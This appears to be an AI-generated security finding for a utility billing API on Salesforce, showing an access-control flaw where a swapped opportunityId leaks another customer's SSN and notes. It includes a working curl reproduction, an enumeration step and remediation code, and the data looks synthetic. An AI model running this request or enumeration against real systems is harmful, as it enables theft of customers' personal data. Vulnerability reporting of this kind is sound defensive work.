# Security Analysis Report
**System:** PowerGrid Customer Billing API (Energy / Utilities / Smart Grid) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0014 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User / Pattern 10.2 | Parameter escalation via `opportunityId` — attacker accesses other users' billing records |

---

## Finding 1 — Parameter Escalation: Session Scope Extension via `opportunityId` Substitution (CRITICAL)

### Summary
The `OpportunityController` Apex class on PowerGrid Customer Billing API (`a8464434.lightning.force.com`) is declared `without sharing`, bypassing Salesforce OWD=Private for Opportunity records. The `getOpportunity` Aura action accepts an `opportunityId` parameter without validating it belongs to the authenticated user. An attacker with a valid Salesforce session can substitute a victim's `opportunityId` (`0014434`) in the Aura request payload — extending their session's access scope beyond their own records — and retrieve the victim's billing data, internal notes, and PII (SSN).

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://a8464434.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker substituting victim opportunityId):**
```
POST https://a8464434.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DA8464434!ARa8464434...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DA8464434!ARa8464434...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0014434","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0014434",
        "Name": "Victim Opportunity Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-64-1670"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — server does not reject requests with invalid/undefined Aura token.

The response leaks `SensitiveData__c: "SSN: 000-64-1670"` and `InternalNotes__c` belonging to `OwnerId: "005VICTIM"`. In a smart grid billing platform, this can include energy consumption data, billing history, smart meter data, and customer identity.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private bypassed |
| §4.0 SOQL | `WHERE Id = :opportunityId` | No OwnerId predicate | Direct root cause |
| §5.0 Pattern 10.2 | Vulnerability | Session scope extension via parameter | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Vulnerable entry point |
| HAR params | `opportunityId` | `0014434` | Victim record ID substituted by attacker |
| HAR params | `aura.token` | `undefined` | Missing server-side token validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — cross-user access confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-64-1670` | PII/SSN data leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00DA8464434!ARa8464434..."
```

**Step 2 — Call Aura controller with victim's opportunityId (VULNERABLE):**
```bash
curl -s -X POST "https://a8464434.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0014434","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-64-1670
```

**Step 3 — Enumerate billing records:**
```bash
# Substitute opportunityId values (001XXXX pattern) to enumerate all customer billing records
# Each successful response leaks SSN, energy consumption, billing history
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:**
   ```apex
   public with sharing class OpportunityController {
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   'WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()'
   ```
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security in the SOQL query.
4. **Validate `aura.token`:** Reject all Aura requests where `aura.token` is `undefined` or invalid. Enforce server-side Salesforce session validation.
5. **Server-defined field selection:** Remove the client-supplied `fields` parameter; define the allowed field set server-side to prevent field enumeration.
6. **Audit all billing-related controllers** for `without sharing` declarations and missing ownership predicates — smart grid billing data is regulated PII under energy compliance frameworks.
